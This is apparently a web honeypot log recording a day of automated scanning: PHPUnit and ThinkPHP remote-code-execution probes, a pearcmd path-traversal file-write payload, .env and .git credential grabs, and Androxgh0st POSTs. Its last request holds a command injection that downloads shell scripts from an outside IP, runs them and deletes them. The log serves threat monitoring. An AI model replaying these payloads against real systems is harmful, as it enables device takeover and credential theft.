+2025-06-30 00:00:30 INFO:snare.server:handle_request: Request path: /phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:30 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:30 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:31 INFO:snare.server:handle_request: Request path: /phpunit/Util/PHP/eval-stdin.php
+2025-06-30 00:00:31 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:31 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:32 INFO:snare.server:handle_request: Request path: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:32 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:32 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:32 INFO:snare.server:handle_request: Request path: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+2025-06-30 00:00:32 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:32 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:33 INFO:snare.server:handle_request: Request path: /lib/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:33 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:33 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:33 INFO:snare.server:handle_request: Request path: /lib/phpunit/Util/PHP/eval-stdin.php
+2025-06-30 00:00:33 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:33 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:33 INFO:snare.server:handle_request: Request path: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:33 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:33 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:34 INFO:snare.server:handle_request: Request path: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:34 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:34 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:34 INFO:snare.server:handle_request: Request path: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:34 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:34 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:35 INFO:snare.server:handle_request: Request path: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:35 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:35 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:35 INFO:snare.server:handle_request: Request path: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:35 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:35 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:36 INFO:snare.server:handle_request: Request path: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:36 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:36 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:36 INFO:snare.server:handle_request: Request path: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:36 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:36 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:36 INFO:snare.server:handle_request: Request path: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:36 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:36 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:37 INFO:snare.server:handle_request: Request path: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:37 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:37 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:37 INFO:snare.server:handle_request: Request path: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:37 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:37 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:38 INFO:snare.server:handle_request: Request path: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:38 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:38 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:38 INFO:snare.server:handle_request: Request path: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:38 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:38 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:39 INFO:snare.server:handle_request: Request path: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:39 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:39 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:39 INFO:snare.server:handle_request: Request path: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:39 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:39 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:40 INFO:snare.server:handle_request: Request path: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:40 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:40 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:40 INFO:snare.server:handle_request: Request path: /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:40 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:40 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:40 INFO:snare.server:handle_request: Request path: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:40 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:40 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:41 INFO:snare.server:handle_request: Request path: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:41 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:41 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:42 INFO:snare.server:handle_request: Request path: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:42 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:42 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:43 INFO:snare.server:handle_request: Request path: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:43 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:43 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:43 INFO:snare.server:handle_request: Request path: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:43 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:43 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:43 INFO:snare.server:handle_request: Request path: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:43 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:43 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:44 INFO:snare.server:handle_request: Request path: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2025-06-30 00:00:44 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:44 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:44 INFO:snare.server:handle_request: Request path: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
+2025-06-30 00:00:44 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:44 +0000] "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:44 INFO:snare.server:handle_request: Request path: /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
+2025-06-30 00:00:44 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:44 +0000] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:45 INFO:snare.server:handle_request: Request path: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+2025-06-30 00:00:45 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:45 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:45 INFO:snare.server:handle_request: Request path: /index.php?lang=../../../../../../../../tmp/index1
+2025-06-30 00:00:45 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:45 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:00:46 INFO:snare.server:handle_request: Request path: /containers/json
+2025-06-30 00:00:46 INFO:aiohttp.access:log: 113.44.2.32 [30/Jun/2025:00:00:46 +0000] "GET /containers/json HTTP/1.1" 404 433 "-" "Custom-AsyncHttpClient"
+2025-06-30 00:03:56 INFO:snare.server:handle_request: Request path: /systembc/password.php
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "GET /systembc/password.php HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+2025-06-30 00:03:56 INFO:snare.server:handle_request: Request path: /password.php
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "GET /password.php HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-30 00:03:56 INFO:snare.server:handle_request: Request path: /upl.php
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "GET /upl.php HTTP/1.1" 404 433 "-" "Mozilla/5.0"
+2025-06-30 00:03:56 INFO:snare.server:handle_request: Request path: /t4
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "GET /t4 HTTP/1.1" 404 433 "-" "Mozilla/5.0"
+2025-06-30 00:03:56 INFO:snare.server:handle_request: Request path: /geoip/
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "GET /geoip/ HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+2025-06-30 00:03:56 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+2025-06-30 00:03:56 INFO:snare.server:handle_request: Request path: /1.php
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "GET /1.php HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-30 00:03:56 INFO:snare.server:handle_request: Request path: /form.html
+2025-06-30 00:03:56 INFO:aiohttp.access:log: 161.35.165.151 [30/Jun/2025:00:03:56 +0000] "GET /form.html HTTP/1.1" 404 433 "-" "curl/8.1.2"
+2025-06-30 00:15:57 INFO:snare.server:handle_request: Request path: /
+2025-06-30 00:15:57 INFO:aiohttp.access:log: 204.76.203.206 [30/Jun/2025:00:15:57 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-30 00:20:10 INFO:snare.server:handle_request: Request path: /
+2025-06-30 00:20:10 INFO:aiohttp.access:log: 108.165.153.6 [30/Jun/2025:00:20:10 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-30 00:26:42 INFO:snare.server:handle_request: Request path: /.env
+2025-06-30 00:26:42 INFO:aiohttp.access:log: 78.153.140.149 [30/Jun/2025:00:26:42 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-30 00:26:43 INFO:snare.server:handle_request: Request path: /
+2025-06-30 00:26:43 INFO:snare.server:handle_request: POST data:
+2025-06-30 00:26:43 INFO:snare.server:handle_request: 	- 0x[]: androxgh0st
+2025-06-30 00:26:43 INFO:aiohttp.access:log: 78.153.140.149 [30/Jun/2025:00:26:43 +0000] "POST / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-30 00:29:19 INFO:snare.server:handle_request: Request path: /
+2025-06-30 00:29:19 INFO:aiohttp.access:log: 185.218.84.178 [30/Jun/2025:00:29:19 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-30 00:30:37 INFO:snare.server:handle_request: Request path: /
+2025-06-30 00:30:37 INFO:aiohttp.access:log: 66.175.213.4 [30/Jun/2025:00:30:37 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+2025-06-30 00:51:53 INFO:snare.server:handle_request: Request path: /
+2025-06-30 00:51:53 INFO:aiohttp.access:log: 147.185.132.55 [30/Jun/2025:00:51:53 +0000] "GET / HTTP/1.0" 200 2033 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+2025-06-30 01:08:11 INFO:snare.server:handle_request: Request path: /.env
+2025-06-30 01:08:11 INFO:aiohttp.access:log: 213.209.143.71 [30/Jun/2025:01:08:11 +0000] "GET /.env HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.4125.45 Safari/537.36 OPR/74.1.443.33"
+2025-06-30 01:08:12 INFO:snare.server:handle_request: Request path: /
+2025-06-30 01:08:12 INFO:snare.server:handle_request: POST data:
+2025-06-30 01:08:12 INFO:snare.server:handle_request: 	- 0x[]: Graber
+2025-06-30 01:08:12 INFO:aiohttp.access:log: 213.209.143.71 [30/Jun/2025:01:08:12 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.54.30 Safari/537.36 Edg/93.1.4865.1"
+2025-06-30 02:07:58 INFO:aiohttp.access:log: 80.82.77.202 [30/Jun/2025:02:07:58 +0000] "UNKNOWN / HTTP/1.0" 400 222 "-" "-"
+2025-06-30 02:52:07 INFO:snare.server:handle_request: Request path: /
+2025-06-30 02:52:07 INFO:aiohttp.access:log: 149.100.11.243 [30/Jun/2025:02:52:07 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2025-06-30 02:57:59 INFO:snare.server:handle_request: Request path: /
+2025-06-30 02:57:59 INFO:aiohttp.access:log: 2.59.22.234 [30/Jun/2025:02:57:59 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+2025-06-30 02:58:00 INFO:snare.server:handle_request: Request path: /robots.txt
+2025-06-30 02:58:00 INFO:aiohttp.access:log: 2.59.22.234 [30/Jun/2025:02:58:00 +0000] "GET /robots.txt HTTP/1.1" 404 433 "-" "-"
+2025-06-30 02:58:00 INFO:snare.server:handle_request: Request path: /sitemap.xml
+2025-06-30 02:58:00 INFO:aiohttp.access:log: 2.59.22.234 [30/Jun/2025:02:58:00 +0000] "GET /sitemap.xml HTTP/1.1" 404 433 "-" "-"
+2025-06-30 02:58:00 INFO:snare.server:handle_request: Request path: /.well-known/security.txt
+2025-06-30 02:58:00 INFO:aiohttp.access:log: 2.59.22.234 [30/Jun/2025:02:58:00 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 433 "-" "-"
+2025-06-30 02:58:01 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 02:58:01 INFO:aiohttp.access:log: 2.59.22.234 [30/Jun/2025:02:58:01 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
+2025-06-30 03:16:47 INFO:aiohttp.access:log: 20.163.15.165 [30/Jun/2025:03:16:47 +0000] "UNKNOWN / HTTP/1.0" 400 226 "-" "-"
+2025-06-30 03:17:10 INFO:snare.server:handle_request: Request path: /
+2025-06-30 03:17:10 INFO:aiohttp.access:log: 185.218.84.178 [30/Jun/2025:03:17:10 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-30 03:25:12 INFO:snare.server:handle_request: Request path: /
+2025-06-30 03:25:12 INFO:aiohttp.access:log: 104.234.115.237 [30/Jun/2025:03:25:12 +0000] "GET / HTTP/1.0" 200 2033 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
+2025-06-30 03:32:30 INFO:snare.server:handle_request: Request path: /.env
+2025-06-30 03:32:30 INFO:aiohttp.access:log: 78.153.140.149 [30/Jun/2025:03:32:30 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-30 03:32:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 03:32:30 INFO:snare.server:handle_request: POST data:
+2025-06-30 03:32:30 INFO:snare.server:handle_request: 	- 0x[]: androxgh0st
+2025-06-30 03:32:30 INFO:aiohttp.access:log: 78.153.140.149 [30/Jun/2025:03:32:30 +0000] "POST / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-30 03:42:26 INFO:snare.server:handle_request: Request path: /.git/refs/
+2025-06-30 03:42:26 INFO:aiohttp.access:log: 196.251.70.87 [30/Jun/2025:03:42:26 +0000] "GET /.git/refs/ HTTP/1.1" 404 452 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.1 (KHTML, like Gecko) QupZilla/1.8.6 Safari/538.1"
+2025-06-30 04:04:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 04:04:30 INFO:aiohttp.access:log: 119.238.4.2 [30/Jun/2025:04:04:30 +0000] "GET / HTTP/1.0" 200 2033 "-" "curl/7.88.1"
+2025-06-30 04:11:05 INFO:snare.server:handle_request: Request path: /
+2025-06-30 04:11:05 INFO:aiohttp.access:log: 198.235.24.133 [30/Jun/2025:04:11:05 +0000] "GET / HTTP/1.0" 200 2033 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+2025-06-30 04:48:50 INFO:snare.server:handle_request: Request path: /
+2025-06-30 04:48:50 INFO:aiohttp.access:log: 35.203.210.149 [30/Jun/2025:04:48:50 +0000] "GET / HTTP/1.1" 200 2033 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+2025-06-30 05:00:18 INFO:snare.server:handle_request: Request path: /
+2025-06-30 05:00:18 INFO:aiohttp.access:log: 185.218.84.40 [30/Jun/2025:05:00:18 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-30 05:01:02 INFO:snare.server:handle_request: Request path: /actuator/health
+2025-06-30 05:01:02 INFO:aiohttp.access:log: 20.65.195.59 [30/Jun/2025:05:01:02 +0000] "GET /actuator/health HTTP/1.1" 404 433 "-" "Mozilla/5.0 zgrab/0.x"
+2025-06-30 05:07:33 INFO:snare.server:handle_request: Request path: /
+2025-06-30 05:07:33 INFO:aiohttp.access:log: 93.174.93.12 [30/Jun/2025:05:07:33 +0000] "GET / HTTP/1.0" 200 2033 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
+2025-06-30 05:23:09 INFO:snare.server:handle_request: Request path: /.env
+2025-06-30 05:23:09 INFO:aiohttp.access:log: 165.22.230.228 [30/Jun/2025:05:23:09 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
+2025-06-30 05:23:09 INFO:snare.server:handle_request: Request path: /.git/config
+2025-06-30 05:23:09 INFO:aiohttp.access:log: 165.22.230.228 [30/Jun/2025:05:23:09 +0000] "GET /.git/config HTTP/1.1" 404 433 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
+2025-06-30 05:27:02 INFO:snare.server:handle_request: Request path: /
+2025-06-30 05:27:02 INFO:aiohttp.access:log: 204.76.203.206 [30/Jun/2025:05:27:02 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-30 05:59:34 INFO:snare.server:handle_request: Request path: /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F207.167.64.24%2Ftbk.sh%3B%20chmod%20777%20tbk.sh%3B%20sh%20tbk.sh%3B%20tftp%20207.167.64.24%20-c%20get%20tbk1.sh%3B%20chmod%20777%20tbk1.sh%3B%20sh%20tbk1.sh%3B%20tftp%20-r%20tbk2.sh%20-g%20207.167.64.24%3B%20chmod%20777%20tbk2.sh%3B%20sh%20tbk2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%20207.167.64.24%20tbk1.sh%20tbk1.sh%3B%20sh%20tbk1.sh%3B%20rm%20-rf%20tbk.sh%20tbk1.sh%20tbk2.sh%20tbk1.sh
+2025-06-30 05:59:34 INFO:snare.server:handle_request: POST data:
+2025-06-30 05:59:34 INFO:aiohttp.access:log: 64.130.33.147 [30/Jun/2025:05:59:34 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F207.167.64.24%2Ftbk.sh%3B%20chmod%20777%20tbk.sh%3B%20sh%20tbk.sh%3B%20tftp%20207.167.64.24%20-c%20get%20tbk1.sh%3B%20chmod%20777%20tbk1.sh%3B%20sh%20tbk1.sh%3B%20tftp%20-r%20tbk2.sh%20-g%20207.167.64.24%3B%20chmod%20777%20tbk2.sh%3B%20sh%20tbk2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%20207.167.64.24%20tbk1.sh%20tbk1.sh%3B%20sh%20tbk1.sh%3B%20rm%20-rf%20tbk.sh%20tbk1.sh%20tbk2.sh%20tbk1.sh HTTP/1.1" 404 433 "-" "Mozila/5.0"
